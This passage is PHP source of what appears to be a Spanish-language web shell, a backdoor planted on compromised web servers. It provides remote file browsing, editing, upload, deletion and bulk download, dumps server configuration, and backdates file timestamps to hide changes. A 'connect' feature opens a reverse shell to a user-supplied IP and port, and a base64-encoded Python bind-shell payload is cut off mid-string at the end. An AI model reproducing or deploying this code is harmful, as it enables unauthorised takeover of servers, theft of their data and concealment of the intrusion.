					switch (ord($str[$i])) {
						case 0:
							$show_content .= '<font>0</font>';
							break;
						case 10:
						case 13:
						case 32:
							$show_content .= '&nbsp;';
							break;
						default:
							$show_content .= htmlspecialchars($str[$i]);
					}
					$counter++;
					if ($counter == $Config['hexdump_rows']) {
						$counter = 0;
						if ($i + 1 < strlen($str)) {
							$show_offset .= sprintf('%08X', $i + 1) . '<br>';
						}
						$show_hex .= '<br>';
						$show_content .= '<br>';
					}
				}
				//if ($show_hex != '') {$show_offset .= sprintf('%08X',$i).'<br>';}
				$Content .= '<table border=0 bgcolor=#666666 cellspacing=1 cellpadding=4><tr><td bgcolor=#666666>' . $show_offset . '</td><td bgcolor=000000>' . $show_hex . '</td><td bgcolor=000000>' . $show_content . '</td></tr></table><br>';
			} else {
				$str = @fread($fp, filesize($_POST['target']));
				$Content .= '<p>File Content: [<a href="#" onclick="sendData(\'dummy\', Array(\'' . $Config['Mode'] . '\', \'target\', \'hexdump\'), Array(\'info\', \'' . $_POST['target'] . '\', \'full\'));">Hexdump full</a>] [<a href="#" onclick="sendData(\'dummy\', Array(\'' . $Config['Mode'] . '\', \'target\', \'hexdump\'), Array(\'info\', \'' . $_POST['target'] . '\', \'preview\'));">Hexdump preview</a>]<br><textarea class="area" id="filecontent" name="filecontent" cols="100" rows="25" >' . htmlspecialchars($str) . '</textarea><br><br>';
			}
		} else {
			$Content .= simpleDialog('Error leyendo archivo');
		}
		@fclose($fp);
	} elseif (@$_POST[$Config['Mode']] === 'edit') {
		if(file_exists($_POST['target'])) {
			$tmp = pathinfo($_POST['target']);
			$fp = @fopen($_POST['target'], 'r');
			$contents = @fread($fp, filesize($_POST['target']));
			@fclose($fp);
		
			$filemtime = explode('-', @date('Y-m-d-H-i-s', filemtime($_POST['target'])));

			if ($filemtime[0] === '1970') {
				$Content .= simpleDialog('No se puede leer la fecha de creacion!');
			}

			$Content .= '
					<h2>File Edit</h2><br><br>
					<form name="form" action="' . $self . '" method="post" >
						<input type="hidden" name="' . $Config['Menu'] . '" value="file" />
						<input type="hidden" name="' . $Config['Action'] . '" value="moddatefile" />
						<input type="hidden" name="dir" value="' . $tmp['dirname'] . '/" />
						<h3>Clone folder/file was last modified time &raquo;</h3>
						<p>Alter folder/file<br /><input class="input" name="curfile" id="curfile" value="' . $_POST['target'] . '" type="text" size="120"  /></p>
						<p>Reference folder/file (fullpath)<br /><input class="input" name="tarfile" id="tarfile" value="" type="text" size="120"  /></p>
						<p><input class="bt" name="submit" id="submit" type="submit" value="Submit"></p>
					</form>
					
					<form name="form" action="' . $self . '" method="post" >
						<input type="hidden" name="' . $Config['Menu'] . '" value="file" />
						<input type="hidden" name="' . $Config['Action'] . '" value="moddate" />
						<input type="hidden" name="dir" value="' . $tmp['dirname'] . '/" />
						<h3>Set last modified &raquo;</h3>
						<p>
							Current folder/file (fullpath)<br />
							<input class="input" name="curfile" id="curfile" value="' . $_POST['target'] . '" type="text" size="120" />
						</p>
						<p>
							year: <input class="input" name="year" id="year" value="' . $filemtime[0] . '" type="text" size="4" />
							month: <input class="input" name="month" id="month" value="' . $filemtime[1] . '" type="text" size="2" />
							day: <input class="input" name="day" id="day" value="' . $filemtime[2] . '" type="text" size="2" />
							hour: <input class="input" name="hour" id="hour" value="' . $filemtime[3] . '" type="text" size="2" />
							minute: <input class="input" name="minute" id="minute" value="' . $filemtime[4] . '" type="text" size="2" />
							second: <input class="input" name="second" id="second" value="' . $filemtime[5] . '" type="text" size="2" />
						</p>
						<p><input class="bt" name="submit" id="submit" type="submit" value="Submit"></p>
					</form>

					<form name="form" action="' . $self . '" method="post" >
						<input type="hidden" name="' . $Config['Menu'] . '" value="file" />
						<input type="hidden" name="' . $Config['Action'] . '" value="edit" />
						<input type="hidden" name="dir" value="' . $tmp['dirname'] . '/" />
						<p>File Name:<br><input class="input" name="editfilename" value="' . $_POST['target'] . '" type="text" size="100%"></p><br>
						<p>File Content:<br><center><textarea class="area" id="filecontent" name="filecontent" cols="100" rows="25" style="width: 99%;">' . htmlspecialchars($contents) . '</textarea></center>
						<br><br><center><input class="bt" name="submit" id="submit" type="submit" value="Submit"></center><br><br>
					</form>';
		}
	} else {
        # Acciones
        // Obtenemos el directorio en el que estamos
        $current_dir = @$_POST['dir'];
        if (empty($current_dir)) $current_dir = $nowpath;

        if (simpleValidate(@$_POST[$Config['Action']])) {
            switch ($_POST[$Config['Action']]) {
                case 'createfile':
                    if (file_exists($current_dir . $_POST['mkfile'])) {
                        $Content .= simpleDialog('<b>Make File "' . $_POST['mkfile'] . '"</b>: object alredy exists');
                    } elseif (! fopen($current_dir . $_POST['mkfile'], 'w')) {
                        $Content .= simpleDialog('<b>Make File "' . $_POST['mkfile'] . '"</b>: access denied');
                    } else {
                        $fp = @fopen($current_dir . $_POST['mkfile'], 'w');
                        @fclose($fp);
                        $Content .= simpleDialog('<b>Archivo "' . $_POST['mkfile'] . '" creado correctamente</b>');
                    }
                    break;

                case 'createdir':
                    if (file_exists($current_dir . $_POST['newdirname'])) {
                        $Content .= simpleDialog('<b>El directorio ya existe</b>');
                    } else {
                        $Content .= simpleDialog('<b>Directorio creado ' . (@mkdir($current_dir . $_POST['newdirname'], 0777, true) ? 'correctamente' : 'fallo') . '</b>');
                        @chmod($current_dir . $_POST['newdirname'], 0777);
                    }
                    break;

                case 'deldir':
                    if (! file_exists($_POST['deldir'])) {
                        $Content .= simpleDialog($_POST['deldir'] . ' directory does not exist');
                    } else {
                        $Content .= simpleDialog('Directorio borrado ' . (delTree($_POST['deldir']) ? basename($_POST['deldir']) . ' correctamente' : 'fallo'));
                    }
                    break;

                case 'upload':
                    $Content .= simpleDialog('Archivo subido ' . (@copy($_FILES['uploadfile']['tmp_name'], $_POST['dir'] . '/' . $_FILES['uploadfile']['name']) ? 'correctamente' : 'fallo'));
                    break;

                case 'edit': // Editar archivo
                    $fp = @fopen($_POST['editfilename'], 'w');
                    $Content .= simpleDialog('Archivo guardado ' . (@fwrite($fp, $_POST['filecontent']) ? 'correctamente' : 'fallo'));
                    @fclose($fp);
                    break;

                case 'modpers': //Modificar atributos de archivo
                    if (! file_exists($pfile)) {
                        $Content .= simpleDialog('El archivo original no existe');
                    } else {
                        $newperm = base_convert($newperm, 8, 10);
                        $Content .= simpleDialog('Atributos modificados ' . (@chmod($pfile, $newperm) ? 'correctamente' : 'fallo'));
                    }
                    break;

                case 'rename': // Renombrar basenames
                    $nname = $nowpath . @$_POST['newfilename'];
                    if (file_exists($nname) or ! file_exists($_POST['oldfilename'])) {
                        $Content .= simpleDialog($nname . ' Ya existe o el archivo original esta perdido');
                    } else {
                        $Content .= simpleDialog('"' . basename($_POST['oldfilename']) . '" renamed "' . basename($nname) . (@rename($_POST['oldfilename'], $nname) ? '" correctamente' : '" fallo'));
                    }
                    break;

                case 'copy':
					if (@$_POST['dl']) {
                        $failnames = '';
						$succ = $fail = 0;
						
                        for ($z = 0; count($_POST['dl']) > $z; $z++) {
							$fileinfo = pathinfo($_POST['dl'][$z]);
							if (file_exists($_POST['copy'].$fileinfo['basename']) || ! file_exists($_POST['dl'][$z])) {
								$Content .= simpleDialog('Ya existe o el archivo original esta perdido');
							} else {
								if (is_dir($_POST['dl'][$z])) { 
								    if (@recursiveCopy($_POST['dl'][$z], $_POST['copy'] . $fileinfo['basename'] . '/')) {
										$succ++;
									} else {
										$failnames .= $_POST['dl'][$z] . ' ';
										$fail++;
									}
								} else {
									if (@copy($_POST['dl'][$z], $_POST['copy'] . $fileinfo['basename'])) {
										$succ++;
									} else {
										$failnames .= $_POST['dl'][$z] . ' ';
										$fail++;
									}
								}
							}                            
                        }
                    
                        $Content .= simpleDialog('Copiado finalizado: ' . count($_POST['dl']) . '<br> correctamente ' . $succ . ' - fallidos ' . $fail . ' ' . $failnames);
                    } else {
                        $Content .= simpleDialog('Selecciona archivo(s)');
                    }
                    break;

                case 'moddatefile': // Modificar fecha de archivo copiando la de otro archivo
                    if (! @file_exists($curfile) || ! @file_exists($tarfile)) {
                        $Content .= simpleDialog('Ya existe o el archivo original esta perdido');
                    } else {
                        $time = @filemtime($tarfile);
                        $Content .= simpleDialog('Modificar fecha ' . (@touch($curfile, $time, $time) ? 'correctamente' : 'fallo'));
                    }
                    break;

                case 'moddate': // Modificar fecha de archivo
                    if (! @file_exists($_POST['curfile'])) {
                        $Content .= simpleDialog(basename($_POST['curfile']) . ' no existe');
                    } else {
                        $time = strtotime($_POST['year'] . '-' . $_POST['month'] . '-' . $_POST['day'] . ' ' . $_POST['hour'] . ':' . $_POST['minute'] . ':' . $_POST['second']);
                        $Content .= simpleDialog('Modificada fecha ' . (@touch($_POST['curfile'], $time, $time) ? 'correctamente' : 'fallo'));
                    }
                    break;

                case 'compress':
                    if ($_POST['dl']) {
                        $zip = new PHPZip();
                        $zip->Zipper($_POST['dl']);

                        //SI EL ARCHIVO ES MUY PESADO ESTE METODO PUEDE FALLAR
                        //ASI QUE TENDRIA QUE CHEQUEAR PESO Y SI ES MUY PESADO GENERAR EL DUMP EN DISCO Y DESPUES BORRARLO
                        header('Content-type: application/octet-stream');
                        header('Accept-Ranges: bytes');
                        //header('Accept-Length: ' . strlen($compress));//no tengo peso que pasarle, a menos que lo ponga adentro de una variable
                        header('Content-Disposition: attachment;filename=' . $_SERVER['HTTP_HOST'] . '_' . date('Ymd-H:i:s') . '.zip');
                        echo $zip->file();
                        exit;
                    } else {
                        $Content .= simpleDialog('Selecciona que comprimir');
                    }
                    break;

                case 'delfiles':
					if (@$_POST['dl']) {
                        $succ = $fail = 0;
                        for ($z = 0; count($_POST['dl']) > $z; $z++) {
                            if (is_dir($_POST['dl'][$z])) {
                                if (@delTree($_POST['dl'][$z])) {
                                    $succ++;
                                } else {
                                    $fail++;
                                }
                            } else {
                                if (@unlink($_POST['dl'][$z])) {
                                    $succ++;
                                } else {
                                    $fail++;
                                }

                            }
                        }
                        $Content .= simpleDialog('Borrado ha finalizado: ' . count($_POST['dl']) . ' correctamente ' . $succ . ' - fallidos ' . $fail);
                    } else {
                        $Content .= simpleDialog('Selecciona archivo(s)');
                    }
                    break;

                case 'downfile':
                    if (! @file_exists($_POST['downfile'])) {
                        $Content .= simpleDialog('The file you want Downloadable was nonexistent');
                    } else {
                        $fileinfo = pathinfo($_POST['downfile']);
                        header('Content-type: application/x-' . $fileinfo['extension']);
                        header('Content-Disposition: attachment; filename=' . $fileinfo['basename']);
                        header('Content-Length: ' . filesize($_POST['downfile']));
                        @readfile($_POST['downfile']);
                        exit;
                    }
                    break;
            }
        }

        $dir_writeable = @is_writable($nowpath) ? $Lang['writable'] : $Lang['no'] . ' ' . $Lang['writable'];

        $Content .= '<form id="filelist" name="filelist" action="' . $self . '" method="post" enctype="multipart/form-data">
			<div id="info"></div>
			<table width="100%" border="0" cellpadding="15" cellspacing="0"><tr><td>';

        $free = @disk_free_space($nowpath);
        ! $free && $free = 0;
        $all = @disk_total_space($nowpath);
        ! $all && $all = 0;
        $used = $all - $free;
        $used_percent = @round(100 / ($all / $free), 2);

        $Content .= '<h2>' . $Lang['freespace'] . ' ' . sizecount($free) . ' ' . $Lang['of'] . ' ' . sizecount($all) . ' (' . $used_percent . '%)</h2>
			
			<table width="100%" border="0" cellpadding="0" cellspacing="0" style="margin:10px 0;">
			  <tr>
					<td nowrap>' . $Lang['acdir'] . ' [' . $dir_writeable . ($isWIN ? '' : ', ' . getChmod($nowpath)) . ']: </td>
					<td width="100%">
					&nbsp;<input class="input" name="dir" value="' . $current_dir . '" type="text" size="100%">
					&nbsp;<input class="bt" value="IR" type="submit">
					</td>
			  </tr>
			</table>

			<tr class="alt1"><td colspan="7" style="padding:5px;">
			<div style="float:right;">
			<input class="input" name="uploadfile" value="" type="file" />
			<input class="bt" value="Upload" type="submit" onclick="process(\'upload\');return false;">
			</div>';

        if ($isWIN && $isCOM) {
            $obj = new COM('scripting.filesystemobject');
            if ($obj && is_object($obj)) {
                $Content .= $Lang['dd'] . ': ';

                $DriveTypeDB = array(
                    0 => 'Unknow',
                    1 => 'Removable',
                    2 => 'Fixed',
                    3 => 'Network',
                    4 => 'CDRom',
                    5 => 'RAM Disk');
                foreach ($obj->Drives as $drive) {
                    if ($drive->DriveType == 2) {
                        $Content .= ' [<a href="#" onclick="sendData(\'dummy\', Array(\'dir\'), Array(\'' . $drive->Path . '/\'));" title="Size:' . sizecount($drive->TotalSize) . 'Free:' . sizecount($drive->FreeSpace) . 'Type:' . $DriveTypeDB[$drive->DriveType] . '">' . $DriveTypeDB[$drive->DriveType] . ' ' . $drive->Path . '</a>] ';
                    } else {
                        $Content .= ' [<a href="#" onclick="if (confirm(\'Make sure that disk is avarible, otherwise an error may occur.\')) sendData(\'dummy\', Array(\'dir\'), Array(\'' . $drive->Path . '/\')); return false;" title="Type: ' . $DriveTypeDB[$drive->DriveType] . '">' . $DriveTypeDB[$drive->DriveType] . ' ' . $drive->Path . '</a>]';
                    }
                }

                $Content .= '<br>';
            }
        }

        $Content .= '
		<a href="#" onclick="sendData(\'dummy\', Array(\'dir\'), Array(\'' . $_SERVER['DOCUMENT_ROOT'] . '/\'))">' . $Lang['webroot'] . '</a> | 
		<a href="#" onclick="sendData(\'dummy\', Array(\'dir\', \'view_writable\'), Array(\'' . $nowpath . '/\', \'dir\'))">' . $Lang['vwdir'] . '</a> | 
		<a href="#" onclick="sendData(\'dummy\', Array(\'dir\', \'view_writable\'), Array(\'' . $nowpath . '/\', \'file\'))">' . $Lang['vwfils'] . '</a> | 
		<a href="#" onclick="createdir(\'' . $current_dir . '\');return false;">' . $Lang['cdir'] . '</a> | 
		<a href="#" onclick="createfile(\'' . $current_dir . '\');return false;">' . $Lang['cfil'] . '</a>
		
		</td></tr></table>
		<br>';

        $dirdata = array();
        $filedata = array();
		
		if (@$_POST['view_writable'] === 'dir') {
			$dirdata = GetWDirList($current_dir);
		} elseif (@$_POST['view_writable'] === 'file') {
			$filedata = GetWFileList($current_dir);
		} elseif (@simpleValidate($_POST['findstr'])) {
			$filedata = GetSFileList($current_dir, $_POST['findstr'], $_POST['re']);
		} else {
            // Abrir directorios
            if ($dirs = @opendir($current_dir)) {
                while ($file = @readdir($dirs)) {
                    $filepath = $current_dir . $file;
                    if (@is_dir($filepath)) {
                        if ($file !== '.' and $file !== '..') {
                            $dirdb['filename'] = $file;
                            $dirdb['mtime'] = @date('Y-m-d H:i:s', filemtime($filepath)); //se podria usar filetime directamente?
                            $dirdb['dirchmod'] = getChmod($filepath);
                            $dirdb['dirperm'] = getPerms($filepath);
                            $dirdb['fileowner'] = getUser($filepath);
                            $dirdb['dirlink'] = $current_dir;
                            $dirdb['server_link'] = $filepath . '/';
                            //$dirdb['client_link'] = urlencode($filepath);
                            $dirdata[] = $dirdb;
                        }
                    } else {
                        $filedb['filename'] = $file;
                        $filedb['size'] = sizecount(@filesize($filepath));
                        $filedb['mtime'] = @date('Y-m-d H:i:s', filemtime($filepath));
                        $filedb['filechmod'] = getChmod($filepath);
                        $filedb['fileperm'] = getPerms($filepath);
                        $filedb['fileowner'] = getUser($filepath);
                        $filedb['dirlink'] = $current_dir;
                        $filedb['server_link'] = $filepath;
                        //$filedb['client_link'] = urlencode($filepath);
                        $filedata[] = $filedb;
                    }
                }
                unset($dirdb);
                unset($filedb);
                @closedir($dirs);
                @sort($dirdata);
                @sort($filedata);
            } else {
				$Content .= simpleDialog('No se puede abrir la carpeta');
			}
        }

        $dir_i = count($dirdata);
        $file_i = count($filedata);

        //error de lectura
        if (($dir_i == 0) and ($file_i == 0)) {
            $Content .= '<br><center><b>' . $Img['lnk'] . ' <a href="#" onclick="sendData(\'dummy\', Array(\'dir\'), Array(\'' . getUpPath($current_dir) . '\'))">La carpeta esta vacia o no se puede abrir la misma!</a></b></center>';
        } else {
			$Content .= '<table width="100%" border="0" cellpadding="0" cellspacing="0" style="margin:10px 0;">
			<tr class="' . bg() . '">
			<td></td>
			<td><b>' . $Lang['name'] . '</b></td>
			<td><b>' . $Lang['date'] . '</b></td>
			<td><b>' . $Lang['size'] . '</b></td>
			' . (! $isWIN ? '<td width="20%">Chmod/Chown</b></td>' : '') . '
			<td><b>' . $Lang['action'] . '</b></td>
			</tr>';
			
            //pagino carpetas
            $thisbg = bg();
            $Content .= '<tr class="' . $thisbg . '" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'' . $thisbg . '\';">
					<td width="1%"></td>
					<td width="100%" nowrap>' . $Img['lnk'] . ' <a href="#" onclick="sendData(\'dummy\', Array(\'dir\'), Array(\'' . getUpPath($current_dir) . '\'))">Parent Directory</a></td>
					<td nowrap></td>
					<td nowrap></td>
					' . (! $isWIN ? '<td nowrap></td>' : '') . '
					<td nowrap></td>
					</tr>';
			
			$dir_i = 0;
            foreach ($dirdata as $key => $dirdb) {
                $thisbg = bg();
                $Content .= '<tr class="' . $thisbg . '" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'' . $thisbg . '\';">
							<td nowrap><input type="checkbox" value="' . $dirdb['server_link'] . '" name="dl[]"></td>
							<td>' . $Img['dir'] . ' <a href="#" onclick="sendData(\'dummy\', Array(\'dir\'), Array(\'' . $dirdb['server_link'] . '\'))">' . $dirdb['filename'] . '</a></td>
							<td nowrap>' . $dirdb['mtime'] . '</td>
							<td nowrap><a href="#" onclick="viewSize(\'' . $dirdb['server_link'] . '\', \'D' . $dir_i . '\');return false;"><div id="D' . $dir_i . '">[?]</div></a></td>
							' . (! $isWIN ? '<td nowrap>
							<a href="#" onclick="fileperm(\'' . $dirdb['server_link'] . '\');return false;">' . $dirdb['dirchmod'] . '</a>
							<a href="#" onclick="fileperm(\'' . $dirdb['server_link'] . '\');return false;">' . $dirdb['dirperm'] . '</a>' . $dirdb['fileowner'] . '</td>' : '') . '
							<td nowrap><a href="#" onclick="deldir(\'' . $dirdb['server_link'] . '\');return false;">' . $Img['del'] . '</a> <a href="#" onclick="rename(\'' . $dirdb['server_link'] . '\');return false;">' . $Img['edit'] . '</a></td>
							</tr>';
							
				$dir_i++;
            }

            //pagino archivos
            foreach ($filedata as $key => $filedb) {
                $thisbg = bg();
                $fileurl = str_replace(SA_ROOT, '', $filedb['server_link']);

                $Content .= '<tr class="' . $thisbg . '" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'' . $thisbg . '\';">
							<td width="2%" nowrap><input type="checkbox" value="' . $filedb['server_link'] . '" name="dl[]"></td>';

                // marco archivo de la shell en la lista
                if (strstr($filedb['server_link'], $_SERVER['PHP_SELF'])) {
                    $Content .= '<td>' . $Img['php'] . ' <font color="yellow">' . $filedb['filename'] . '</font></td>';
                } else {
                    $Content .= '<td>' . showIcon($filedb['filename']) . ' <a href="' . $fileurl . '" target="_blank">' . $filedb['filename'] . '</a></td>';
                }

                $Content .= '<td nowrap><a href="#" onclick="">' . $filedb['mtime'] . '</a></td>
							<td nowrap>' . $filedb['size'] . '</td>
							' . (! $isWIN ? '<td nowrap>
							<a href="#" onclick="javascript:fileperm(\'' . $filedb['server_link'] . '\');return false;">' . $filedb['filechmod'] . '</a>
							<a href="#" onclick="javascript:fileperm(\'' . $filedb['server_link'] . '\');return false;">' . $filedb['fileperm'] . '</a>' . $filedb['fileowner'] . '</td>' : '') . '
							<td nowrap>
							<a href="#" onclick="sendData(\'dummy\', Array(\'' . $Config['Mode'] . '\', \'target\'), Array(\'info\', \'' . $filedb['server_link'] . '\'));">' . $Img['info'] . '</a> 
							<a href="#" onclick="sendData(\'dummy\', Array(\'' . $Config['Mode'] . '\', \'target\'), Array(\'edit\', \'' . $filedb['server_link'] . '\'));">' . $Img['edit'] . '</a> 
							<a href="#" onclick="sendData(\'downfile\', Array(\'downfile\'), Array(\'' . $filedb['server_link'] . '\'));return false;">' . $Img['download'] . '</a> 
							</td></tr>';
            }

            $Content .= '<tr class="' . bg() . '">
					<td width="2%" nowrap>
					<input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form)" />
					</td>
					<td>
					' . $Lang['selected'] . ': 
					<a href="#" onclick="process(\'compress\');return false;">' . $Lang['download'] . '</a> | 
					<a href="#" onclick="if (confirm(\'' . $Lang['merror'] . '\')) process(\'delfiles\');return false;">' . $Lang['del'] . '</a> | 
					<a href="#" onclick="copyfile();return false;">' . $Lang['copy'] . '</a>
					</td>
					<td colspan="4" align="right">
					<b>' . $dir_i . '</b> ' . $Lang['dirs'] . ' / <b>' . $file_i . '</b> ' . $Lang['fils'] . '
					</td>
					</tr>
					</form></table>';
        }
    }
}

if (@$_POST[$Config['Menu']] === 'phpenv') {
    $upsize = getcfg('file_uploads') ? getcfg('upload_max_filesize') : 'Not allowed';
    $adminmail = isset($_SERVER['SERVER_ADMIN']) ? $_SERVER['SERVER_ADMIN'] : getcfg('sendmail_from');
    $dis_func = get_cfg_var('disable_functions');
    ! $dis_func && $dis_func = 'No';

    $info = array(
        1 => array('Server Time', date('Y/m/d h:i:s', time())),
        2 => array('Server Domain', $_SERVER['SERVER_NAME']),
        3 => array('Server IP', gethostbyname($_SERVER['SERVER_NAME'])),
        4 => array('Server OS', PHP_OS),
        5 => array('Server OS Charset', $_SERVER['HTTP_ACCEPT_LANGUAGE']),
        6 => array('Server Software', $_SERVER['SERVER_SOFTWARE']),
        7 => array('Server Web Port', $_SERVER['SERVER_PORT']),
        8 => array('PHP run mode', php_sapi_name()),
        9 => array('This file path', __file__),

        10 => array('PHP Version', PHP_VERSION),
        11 => array('PHP Info', ((function_exists('phpinfo') and @! in_array('phpinfo', $dis_func)) ? '<a href="?' . $Config['Menu'] . '=phpinfo" target="_blank">Yes</a>' : 'No')),
        12 => array('Safe Mode', getcfg('safe_mode')),
        13 => array('Administrator', $adminmail),
        14 => array('allow_url_fopen', getcfg('allow_url_fopen')),
        15 => array('enable_dl', getcfg('enable_dl')),
        16 => array('display_errors', getcfg('display_errors')),
        17 => array('register_globals', getcfg('register_globals')),
        18 => array('magic_quotes_gpc', getcfg('magic_quotes_gpc')),
        19 => array('memory_limit', getcfg('memory_limit')),
        20 => array('post_max_size', getcfg('post_max_size')),
        21 => array('upload_max_filesize', $upsize),
        22 => array('max_execution_time', getcfg('max_execution_time') . ' second(s)'),
        23 => array('disable_functions', $dis_func),

        24 => array('MySQL', getfun('mysql_connect')),
        25 => array('MSSQL', getfun('mssql_connect')),
        26 => array('PostgreSQL', getfun('pg_connect')),
        27 => array('Oracle', getfun('ocilogon')),

        28 => array('Curl', getfun('curl_version')),
        29 => array('gzcompress', getfun('gzcompress')),
        30 => array('gzencode', getfun('gzencode')),
        31 => array('bzcompress', getfun('bzcompress')),
        );

    if (@simpleValidate($_POST['phpvarname'])) {
        $Content .= simpleDialog($_POST['phpvarname'] . ': ' . getcfg($_POST['phpvarname']));
    }

    $Content .= '<form name="form1" action="" method="post" > 
        <h2>Variables del servidor »</h2> 
        <p>Ingrese los parametros PHP de configuracion (ej: magic_quotes_gpc)
        <input class="input" name="phpvarname" id="phpvarname" value="" type="text" size="100" /></p> 
        <p><input class="bt" name="submit" id="submit" type="submit" value="Submit"></p> 
        </form>';

    $hp = array(
        0 => 'Server',
        1 => 'PHP',
        2 => 'Extras');
    for ($a = 0; $a < 3; $a++) {
        $Content .= '<h2>' . $hp[$a] . ' »</h2>';
        $Content .= '<ul class="info">';
        if ($a == 0) {
            for ($i = 1; $i <= 9; $i++) {
                $Content .= '<li><b>' . $info[$i][0] . ':</b> ' . $info[$i][1] . '</li>';
            }
        } elseif ($a == 1) {
            for ($i = 10; $i <= 23; $i++) {
                $Content .= '<li><b>' . $info[$i][0] . ':</b> ' . $info[$i][1] . '</li>';
            }
        } elseif ($a == 2) {
            for ($i = 24; $i <= 31; $i++) {
                $Content .= '<li><b>' . $info[$i][0] . ':</b> ' . $info[$i][1] . '</li>';
            }
        }

        $Content .= '</ul>';
    }
}


if (@$_POST[$Config['Menu']] === 'phpinfo') {
    if (function_exists('phpinfo') and @! in_array('phpinfo', $dis_func)) {
        phpinfo();
        exit;
    } else {
        $Content = simpleDialog('phpinfo() function has non-permissible');
    }
}


if (@$_POST[$Config['Menu']] === 'selfremove') {
    if ((isset($_POST['submit'])) and ($_POST['submit'] == $_POST['rndcode'])) {
        if (unlink(__file__)) {
            @ob_clean();
            exit;
        } else {
            $Content .= '<center><b>Can\'t delete ' . __file__ . '!</b></center>';
        }
    } else {
        $rnd = rand(0, 9) . rand(0, 9) . rand(0, 9);
        $Content .= '<form action="" method="post"><b>Self-remove: ' . __file__ . '<br><b>' . $Lang['merror'] . '<br>For confirmation enter this code: ' . $rnd . '</b> <input type=hidden name=rndcode value="' . $rnd . '"><input type=text name=submit> <input type=submit value="YES"></form>';
    }
}

if (@$_POST[$Config['Menu']] === 'connect') { //Basada en AniShell
    if (@simpleValidate($_POST['ip']) && simpleValidate($_POST['port'])) {
        $Content .= '<p>The Program is now trying to connect!</p>';
        $ip = $_POST['ip'];
        $port = $_POST['port'];
        $sockfd = fsockopen($ip, $port, $errno, $errstr);
        if ($errno != 0) {
            $Content .= '<font color="red"><b>' . $errno . '</b>: ' . $errstr . '</font>';
        } else
            if (! $sockfd) {
                $result = '<p>Fatal: An unexpected error was occured when trying to connect!</p>';
            } else {
                $len = 1500;
                fputs($sockfd, execute('uname -a') . "\n"); //sysinfo
                fputs($sockfd, execute('pwd') . "\n");
                fputs($sockfd, execute('id') . "\n\n");
                fputs($sockfd, execute('time /t & date /T') . "\n\n"); //dateAndTime

                while (! feof($sockfd)) {
                    fputs($sockfd, '(Shell)[$]> ');
                    $command = fgets($sockfd, $len);
                    fputs($sockfd, "\n" . execute($command) . "\n\n");
                }
                fclose($sockfd);
            }
    } else
        if (@(simpleValidate($_POST['port'])) && (simpleValidate($_POST['passwd'])) && (simpleValidate($_POST['mode']))) {
            $address = '127.0.0.1';
            $port = $_POST['port'];
            $pass = $_POST['passwd'];

            if ($_POST['mode'] === 'Python') {
                $Python_CODE = "IyBTZXJ2ZXIgIA0KIA0KaW1wb3J0IHN5cyAgDQppbXBvcnQgc29ja2V0ICANCmltcG9ydCBvcyAgDQoNCmhvc3QgPSAnJzsgIA0KU0laRSA9IDUxMjsgIA0KDQp0cnkgOiAgDQogICAgIHBvcnQgPSBzeXMuYXJndlsxXTsgIA0KDQpleGNlcHQgOiAgDQogICAgIHBvcnQgPSAzMTMzNzsgIA0KIA0KdHJ5IDogIA0KICAgICBzb2NrZmQgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVUICwgc29ja2V0LlNPQ0tfU1RSRUFNKTsgIA0KDQpleGNlcHQgc29ja2V0LmVycm9yICwgZSA6ICANCg0KICAgICBwcmludCAiRXJyb3IgaW4gY3JlYXRpbmcgc29ja2V0IDogIixlIDsgIA0KICAgICBzeXMuZXhpdCgxKTsgICANCg0Kc29ja2ZkLnNldHNvY2tvcHQoc29ja2V0LlNPTF9TT0NLRVQgLCBzb2NrZXQuU09fUkVVU0VBRERSICwgMSk7ICANCg0KdHJ5IDogIA0KICAgICBzb2NrZmQuYmluZCgoaG9zdCxwb3J0KSk7ICANCg0KZXhjZXB0IHNvY2tldC5lcnJvciAsIGUgOiAgICAgICAgDQogICAgIHByaW50ICJFcnJvciBpbiBCaW5kaW5nIDogIixlOyANCiAgICAgc3lzLmV4aXQoMSk7ICANCiANCnByaW50KCJcblxuPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09Iik7IA0KcHJpbnQoIi0tLS0tLS0tIFNlcnZlciBMaXN0ZW5pbmcgb24gUG9ydCAlZCAtLS0tLS0tLS0tLS0tLSIgJSBwb3J0KTsgIA0KcHJpbnQoIj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PVxuXG4iKTsgDQogDQp0cnkgOiAgDQogICAgIHdoaWxlIDEgOiAjIGxpc3RlbiBmb3IgY29ubmVjdGlvbnMgIA0KICAgICAgICAgc29ja2ZkLmxpc3RlbigxKTsgIA0KICAgICAgICAgY2xpZW50c29jayAsIGNsaWVudGFkZHIgPSBzb2NrZmQuYWNjZXB0KCk7ICANCiAgICAgICAgIHByaW50KCJcblxuR290IENvbm5lY3Rpb24gZnJvbSAiICsgc3RyKGNsaWVudGFkZHIpKTsgIA0KICAgICAgICAgd2hpbGUgMSA6ICANCiAgICAgICAgICAgICB0cnkgOiAgDQogICAgICAgICAgICAgICAgIGNtZCA9IGNsaWVudHNvY2sucmVjdihTSVpFKTsgIA0KICAgICAgICAgICAgIGV4Y2VwdCA6ICANCiAgICAgICAgICAgICAgICAgYnJlYWs7ICANCiAgICAgICAgICAgICBwaXBlID0gb3MucG9wZW4oY21kKTsgIA0KICAgICAgICAgICAgIHJhd091dHB1dCA9IHBpcGUucmVhZGxpbmVzKCk7ICANCiANCiAgICAgICAgICAgICBwcmludChjbWQpOyAgDQogICAgICAgICAgIA0KICAgICAgICAgICAgIGlmIGNtZCA9PSAnZzJnJzogIyBjbG9zZSB0aGUgY29ubmVjdGlvbiBhbmQgbW92ZSBvbiBmb3Igb3RoZXJzICANCiAgICAgICAgICAgICAgICAgcHJpbnQoIlxuLS0tLS0tLS0tLS1Db25uZWN0aW9uIENsb3NlZC0tLS0tLS0tLS0tLS0tLS0iKTsgIA0KICAgICAgICAgICAgICAgICBjbGllbnRzb2NrLnNodXRkb3duKCk7ICANCiAgICAgICAgICAgICAgICAgYnJlYWs7ICANCiAgICAgICAgICAgICB0cnkgOiAgDQogICAgICAgICAgICAgICAgIG91dHB1dCA9ICIiOyAgDQogICAgICAgICAgICAgICAgICMgUGFyc2UgdGhlIG91dHB1dCBmcm9tIGxpc3QgdG8gc3RyaW5nICANCiAgICAgICAgICAgICAgICAgZm9yIGRhdGEgaW4gcmF3T3V0cHV0IDogIA0KICAgICAgICAg